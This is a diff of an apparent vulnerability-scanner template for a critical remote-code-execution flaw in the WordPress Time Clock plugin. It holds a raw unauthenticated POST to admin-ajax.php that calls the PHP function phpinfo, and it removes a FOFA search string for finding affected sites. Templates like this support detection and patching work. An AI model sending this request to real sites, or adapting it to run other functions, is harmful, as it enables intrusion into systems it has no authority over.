@@ -3,12 +3,8 @@ info:
   name: WordPress Time Clock插件存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wayms24bwrtdn7ek'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wayms24bwrtdn7ek
-    fofa: body="/wp-content/plugins/time-clock/" || body="/wp-content/plugins/time-clock-pro/"
 http:
 - raw:
   - 'POST /wp-admin/admin-ajax.php?action=etimeclockwp_load_function HTTP/2
@@ -22,9 +18,7 @@ http:
     Content-Length: 16
 
 
-    function=phpinfo
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730351446867-b4b144e1-ba5e-42da-8bb7-fdace96ff161.png)'
+    function=phpinfo'
   redirects: false
   matchers:
   - status:
